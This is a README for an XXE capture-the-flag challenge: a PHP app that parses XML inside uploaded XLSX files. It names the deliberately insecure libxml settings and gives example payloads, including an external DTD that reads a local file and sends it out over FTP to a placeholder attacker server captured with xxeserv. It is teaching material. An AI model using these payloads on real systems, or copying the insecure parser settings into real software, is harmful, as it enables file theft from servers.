# XXE CTF Challenge - XLSX Upload

A Capture The Flag (CTF) web application vulnerable to XML External Entity (XXE) attacks through XLSX file uploads.

## 🎯 Challenge Overview

This web application allows users to upload Excel (.xlsx) files for processing. The application extracts and processes XML content from within the XLSX files, making it vulnerable to XXE attacks.

## 🏗️ Architecture

```
CTF-ZIP/
├── public/              # Web root directory
│   ├── index.php       # Main upload page
│   ├── upload.php      # File upload handler
│   └── results.php     # Results display page
├── includes/           # PHP includes
│   ├── config.php      # Configuration settings
│   └── functions.php   # Vulnerable XML processing functions
├── uploads/            # Temporary upload directory
├── flag.txt           # The flag to capture
└── README.md          # This file
```

## 🔍 Vulnerability Details

The application is intentionally vulnerable to XXE attacks in the following ways:

1. **XML Entity Processing**: The `processXMLFile()` function enables external entity resolution
2. **Multiple Attack Vectors**: Vulnerable in `workbook.xml`, `sharedStrings.xml`, and worksheet files
3. **Entity Loader**: `libxml_disable_entity_loader(false)` explicitly enables external entities
4. **XML Flags**: Uses `LIBXML_NOENT | LIBXML_DTDLOAD` flags for entity processing

## 🎮 How to Play

### For Players:
1. Access the web application at your target domain
2. Create a malicious XLSX file with XXE payload
3. Upload the file and extract the flag

### Example XXE Payload Structure:

#### In `xl/workbook.xml`:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://YOUR_SERVER:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

#### In `xl/sharedStrings.xml`:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://YOUR_SERVER:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10">
<si><t>&rrr;</t></si>
</sst>
```

#### External DTD (`xxe.dtd`):
```xml
<!ENTITY % d SYSTEM "file:///path/to/flag.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://YOUR_SERVER:2121/%d;'>">
```

## 🚀 Deployment

### Requirements:
- PHP 7.4+ with XML and ZIP extensions
- Web server (Apache/Nginx)
- Domain: `abphz.tech`
- Server IP: `91.228.186.44`

### Setup Instructions:

1. **Clone the repository:**
```bash
git clone <repository-url>
cd CTF-ZIP
```

2. **Configure web server:**
   - Point document root to `public/` directory
   - Ensure PHP extensions are enabled: `xml`, `zip`, `dom`

3. **Set permissions:**
```bash
chmod 755 public/
chmod 777 uploads/
```

4. **Deploy to server:**
```bash
rsync -avz . user@91.228.186.44:/var/www/abphz.tech/
```

### Server Setup with xxeserv:

To capture XXE payloads, use `xxeserv`:

```bash
# Install xxeserv
go get github.com/staaldraad/xxeserv

# Run server to capture payloads
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

## 🔧 Configuration

Edit `includes/config.php` to customize:
- Domain and IP settings
- File upload limits
- Flag content
- Upload directory paths

## ⚠️ Security Warning

**This application is INTENTIONALLY VULNERABLE and should ONLY be used in controlled CTF environments.**

**DO NOT deploy this in production or on systems containing sensitive data.**

## 🎯 Target Information

- **Domain**: abphz.tech
- **IP**: 91.228.186.44
- **Flag Format**: `flag{...}`
- **Challenge Type**: Web Application Security - XXE

## 🏆 Solution Hints

1. XLSX files are ZIP archives containing XML files
2. The application processes XML content without proper entity validation
3. External entities can be used to read local files
4. The flag is located in a predictable location
5. Use tools like `7z` to extract/modify XLSX structure

## 📚 Learning Resources

- [OWASP XXE Prevention](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

## 📄 License

This CTF challenge is provided for educational purposes only.
